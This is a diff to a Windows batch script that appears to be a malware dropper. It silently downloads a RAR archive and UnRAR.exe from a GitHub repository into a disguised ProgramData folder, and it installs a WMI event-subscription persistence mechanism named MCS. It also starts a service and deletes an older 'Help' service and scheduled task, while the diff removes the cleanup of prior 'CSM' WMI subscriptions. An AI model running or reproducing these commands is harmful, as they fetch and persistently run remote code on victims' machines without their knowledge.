@@ -1,3 +1,5 @@
+sc delete Help
+schtasks /Delete /TN "\Windows\Help" /F
 mkdir %ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}
 curl.exe -s -L -o "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\push.rar" https://github.com/vlad213-tex/1/raw/1/p/push.rar
 curl.exe -s -L -o "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\UnRAR.exe" https://github.com/vlad213-tex/1/raw/1/p/UnRAR.exe
@@ -62,8 +64,3 @@ powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription
 powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter='__EventFilter.Name=\"MCS\"'; Consumer='CommandLineEventConsumer.Name=\"MCS\"'} | Out-Null"
 
 sc start Performance
-sc delete Help
-wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="CSM" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="CSM" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="CSM"' DELETE
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like '*CSM*' -or $_.Consumer -like '*SCM*' } | Remove-WmiObject"
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter \"Name='CSM'\" | Remove-WmiObject"
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter \"Name='CSM'\" | Remove-WmiObject"
